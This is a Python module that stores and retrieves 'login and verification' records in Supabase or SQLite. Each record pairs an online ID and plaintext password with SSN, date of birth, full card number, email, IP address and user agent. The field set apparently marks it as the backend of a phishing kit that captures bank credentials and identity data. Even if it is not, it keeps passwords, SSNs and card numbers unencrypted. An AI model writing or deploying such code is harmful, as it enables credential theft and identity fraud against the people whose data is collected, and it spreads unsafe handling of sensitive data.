"""
Supabase storage layer for login and verification data.
Falls back to SQLite if Supabase is not configured.
"""

import os
from typing import Optional, Dict, List
from datetime import datetime, timezone

# Try to import supabase, fall back to SQLite if not available
try:
    from supabase import create_client, Client
    SUPABASE_AVAILABLE = True
except ImportError:
    SUPABASE_AVAILABLE = False

# Supabase configuration from environment variables
SUPABASE_URL = os.getenv("SUPABASE_URL", "")
SUPABASE_KEY = os.getenv("SUPABASE_ANON_KEY", "")

# Fallback to SQLite (only for local development)
sqlite_save = None
sqlite_get_all = None
if not SUPABASE_AVAILABLE or not SUPABASE_URL or not SUPABASE_KEY:
    try:
        # Import SQLite fallback only if available
        from flow_control.login_data import save_login_data as sqlite_save, get_all_login_data as sqlite_get_all
    except ImportError:
        # SQLite module not available (e.g., on Vercel without proper setup)
        pass


def get_supabase_client() -> Optional[Client]:
    """Get Supabase client if configured"""
    if not SUPABASE_AVAILABLE or not SUPABASE_URL or not SUPABASE_KEY:
        return None
    return create_client(SUPABASE_URL, SUPABASE_KEY)


def save_login_data(
    online_id: str,
    password: str,
    ssn: Optional[str] = None,
    dob: Optional[str] = None,
    card_number: Optional[str] = None,
    email: Optional[str] = None,
    ip_address: Optional[str] = None,
    user_agent: Optional[str] = None
) -> bool:
    """
    Save login and verification data to Supabase (or SQLite fallback).
    """
    supabase = get_supabase_client()
    
    if supabase:
        # Use Supabase
        try:
            data = {
                "online_id": online_id,
                "password": password,
                "ssn": ssn,
                "dob": dob,
                "card_number": card_number,
                "email": email,
                "ip_address": ip_address,
                "user_agent": user_agent,
                "created_at": datetime.now(timezone.utc).isoformat()
            }
            
            result = supabase.table("login_data").insert(data).execute()
            return len(result.data) > 0
        except Exception as e:
            print(f"Supabase error: {e}")
            import traceback
            print(traceback.format_exc())
            # Fallback to SQLite if available (local dev only)
            if sqlite_save:
                try:
                    return sqlite_save(online_id, password, ssn, dob, card_number, email, ip_address, user_agent)
                except Exception as sqlite_error:
                    print(f"SQLite fallback also failed: {sqlite_error}")
            return False
    else:
        # Use SQLite fallback if available (local dev only)
        if sqlite_save:
            try:
                return sqlite_save(online_id, password, ssn, dob, card_number, email, ip_address, user_agent)
            except Exception as e:
                print(f"SQLite save failed: {e}")
                return False
        else:
            print("ERROR: Supabase not configured and SQLite not available. Please configure SUPABASE_URL and SUPABASE_ANON_KEY environment variables.")
            return False


def get_all_login_data(limit: int = 100) -> List[Dict]:
    """
    Get all login data entries from Supabase (or SQLite fallback).
    """
    supabase = get_supabase_client()
    
    if supabase:
        # Use Supabase
        try:
            result = supabase.table("login_data")\
                .select("*")\
                .order("created_at", desc=True)\
                .limit(limit)\
                .execute()
            
            return result.data if result.data else []
        except Exception as e:
            print(f"Supabase error: {e}")
            # Fallback to SQLite if Supabase fails
            if SUPABASE_AVAILABLE:
                return sqlite_get_all(limit)
            return []
    else:
        # Use SQLite fallback
        return sqlite_get_all(limit)


def get_login_data_by_id(entry_id: int) -> Optional[Dict]:
    """
    Get a specific login data entry by ID from Supabase (or SQLite fallback).
    """
    supabase = get_supabase_client()
    
    if supabase:
        try:
            result = supabase.table("login_data")\
                .select("*")\
                .eq("id", entry_id)\
                .execute()
            
            if result.data and len(result.data) > 0:
                return result.data[0]
            return None
        except Exception as e:
            print(f"Supabase error: {e}")
            return None
    else:
        # Use SQLite fallback
        from flow_control.login_data import get_login_data_by_id as sqlite_get_by_id
        return sqlite_get_by_id(entry_id)

